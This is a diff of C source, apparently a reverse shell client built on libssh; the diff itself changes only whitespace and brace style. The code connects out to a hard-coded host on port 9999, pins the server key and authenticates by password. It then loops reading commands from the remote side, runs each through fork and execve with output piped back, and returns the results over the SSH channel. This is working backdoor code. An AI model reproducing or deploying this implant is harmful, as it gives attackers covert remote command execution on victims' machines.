@@ -29,7 +29,7 @@ int verify_server(ssh_session session)
 	ssh_get_publickey_hash(server_key, HASH_SHA1, &hash, &hlen);
 	//ssh_print_hexa("Public Key: ", hash, hlen);
 	hex_key = ssh_get_hexa(hash, hlen);
-	if (strcmp(hex_key, host_pubkey) == 0)
+	if(strcmp(hex_key, host_pubkey) == 0)
 		return 0;
 	else
 		return 1;
@@ -43,7 +43,7 @@ void start_client_shell(ssh_session session)
 	pid_t cpid;
 	char result_buffer[1024];
 	int rc;
-	
+
 	ssh_channel shell_channel = ssh_channel_new(session);
 
 
@@ -59,31 +59,32 @@ void start_client_shell(ssh_session session)
 
 	puts("[*] Opened shell channel!");
 
-	
+
 	memset(cmd_buffer, 0, sizeof(cmd_buffer));			
 
 	// Read shell command from channel
 	while(ssh_channel_read(shell_channel, cmd_buffer, sizeof(cmd_buffer), 0) > 0)
 	{
 		/*
-			Open pipe, redirect standard input, output, and error to child pipe, 
-			and execute shell command in child. Receive result in parent and send
-			through channel to server.
+		Open pipe, redirect standard input, output, and error to child pipe, 
+		and execute shell command in child. Receive result in parent and send
+		through channel to server.
 		*/
 		if(pipe(pipefd) == -1) 
 		{
-		   perror("pipe");
-		   exit(EXIT_FAILURE);
+			perror("pipe");
+			exit(EXIT_FAILURE);
 		}
 
 		cpid = fork();
 		if(cpid == -1) 
 		{
-		   perror("fork");
-		   exit(EXIT_FAILURE);
+			perror("fork");
+			exit(EXIT_FAILURE);
 		}
 
-		if(cpid == 0) {
+		if(cpid == 0) 
+		{
 			close(pipefd[0]);
 			dup2(pipefd[1], 0);
 			dup2(pipefd[1], 1);
@@ -94,35 +95,35 @@ void start_client_shell(ssh_session session)
 			char *envp[] = {0};
 
 			execve(filename, argv2, envp);
-			
+
 			_exit(EXIT_SUCCESS);
 
-		} 
+		}
 		else 
 		{
 			close(pipefd[1]);          
 			int loop = 1;
-			
-		   	while(loop)
-		   	{
+
+			while(loop)
+			{
 				memset(result_buffer, 0, sizeof(result_buffer));
-		   		if(read(pipefd[0], result_buffer, sizeof(result_buffer)) > 0)
-		       		ssh_channel_write(shell_channel, result_buffer, sizeof(result_buffer));
-		       	else
-		       		loop = 0;
-		   	}
+				if(read(pipefd[0], result_buffer, sizeof(result_buffer)) > 0)
+					ssh_channel_write(shell_channel, result_buffer, sizeof(result_buffer));
+				else
+					loop = 0;
+			}
 
-		   	ssh_channel_write(shell_channel, end_of_data, strlen(end_of_data));
+			ssh_channel_write(shell_channel, end_of_data, strlen(end_of_data));
 
-		   close(pipefd[0]);
-		   wait(NULL);
+			close(pipefd[0]);
+			wait(NULL);
 		}
 
 		memset(cmd_buffer, 0, sizeof(cmd_buffer));			
 	}
 
 	puts("[*] Closing shell channel.");
-    ssh_channel_free(shell_channel);
+	ssh_channel_free(shell_channel);
 }
 
 
@@ -134,7 +135,7 @@ int main()
 	int port = 9999;
 
 	ssh_session session = ssh_new();
-	if (session == NULL)
+	if(session == NULL)
 		print_error("Failed creating new session", session);
 
 	ssh_options_set(session, SSH_OPTIONS_HOST, host_ip);
@@ -142,32 +143,32 @@ int main()
 	ssh_options_set(session, SSH_OPTIONS_USER, "libssh_user");
 
 	rc = ssh_connect(session);
-	if (rc != SSH_OK)
+	if(rc != SSH_OK)
 		print_error("Failed connecting to session", session);
 
 	puts ("[*] Connected to server!");
 	//print_pubkey(session);
 
 
-	if (verify_server(session) != 0)
+	if(verify_server(session) != 0)
 		print_error("Failed verifying host", session);
 
 	puts("[*] Verified server!");
 
 
 	rc = ssh_userauth_password(session, NULL, password);
-	if (rc != SSH_AUTH_SUCCESS)
+	if(rc != SSH_AUTH_SUCCESS)
 		print_error("Failed authenticating to host", session);	
 
 	puts("[*] Authenticated!");
 
 
 	ssh_channel command_channel = ssh_channel_new(session);
-	if (command_channel == NULL)
+	if(command_channel == NULL)
 		print_error("Failed creating channel", session);
 
 	rc = ssh_channel_open_session(command_channel);
-	if (rc != SSH_OK)
+	if(rc != SSH_OK)
 		print_error("Failed connecting channel", session);
 
 	puts("[*] Opened command channel!");
@@ -185,7 +186,7 @@ int main()
 		puts("[*] Invalid command");
 
 
-    puts("[*] Exiting.");
+	puts("[*] Exiting.");
 
 	ssh_channel_free(command_channel);
 	ssh_disconnect(session);
